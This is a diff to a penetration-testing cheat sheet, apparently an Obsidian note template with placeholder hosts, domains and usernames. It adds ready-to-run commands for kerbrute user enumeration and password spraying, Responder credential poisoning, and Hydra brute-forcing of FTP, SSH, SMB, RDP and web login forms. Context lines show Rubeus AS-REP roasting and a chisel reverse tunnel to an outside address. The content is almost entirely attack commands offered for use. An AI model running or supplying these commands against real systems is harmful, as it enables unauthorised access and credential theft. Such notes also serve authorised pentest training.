@@ -24,10 +24,13 @@
   - [xfreerdp](#xfreerdp)
   - [rdesktop](#rdesktop)
   - [Rubeus](#rubeus)
+  - [kerbrute](#kerbrute)
   - [Impacket](#impacket)
   - [Invoke-RunasCs.ps1](#invoke-runascs.ps1)
   - [smbserver](#smbserver)
   - [chisel](#chisel)
+  - [Responder](#responder)
+  - [Hydra](#hydra)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -422,6 +425,13 @@ rdesktop 192.168.216.165
 ./Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
 ```
 
+### kerbrute
+```bash
+./kerbrute userenum -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES>
+./kerbrute passwordspray -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES> <% tp.frontmatter["PASSWORD"] %>
+```
+
+
 ### Impacket
 **AS-REP Roasting**
 ```bash
@@ -619,6 +629,21 @@ and edit the proxychains with the port that chisel provided
 #When trying to connect to a local port
 C:\\xampp\\htdocs>.\\chisel.exe client 192.168.45.176:8888 R:8090:localhost:80
 ```
+
+### responder
+```bash
+sudo Responder -I tun0 -A
+```
+
+### Hydra
+```bash
+hydra <% tp.frontmatter["RHOST"] %> -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<% tp.frontmatter["RHOST"] %>
+hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+
+sudo hydra -L /usr/share/wordlists/rockyou.txt -p "<% tp.frontmatter["PASSWORD"] %>" rdp://<% tp.frontmatter["RHOST"] %>
+sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<% tp.frontmatter["RHOST"] %>
+```
+
 
 ### Code Snippet to check where our code is executed
 ```bash
